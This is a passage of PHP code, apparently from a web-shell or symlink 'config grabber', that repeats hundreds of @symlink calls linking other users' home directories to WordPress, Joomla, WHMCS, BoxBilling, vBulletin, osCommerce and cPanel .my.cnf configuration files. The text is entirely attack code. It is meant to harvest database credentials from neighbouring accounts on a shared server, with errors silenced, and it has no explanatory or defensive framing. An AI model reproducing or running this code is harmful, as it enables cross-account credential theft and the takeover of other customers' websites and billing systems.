@symlink('/home/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//Home1

@symlink('/home1/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home1/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home1/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home1/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home1/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home1/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home1/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home1/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home1/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home1/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home1/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home1/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home2

@symlink('/home2/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home2/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home2/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home2/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
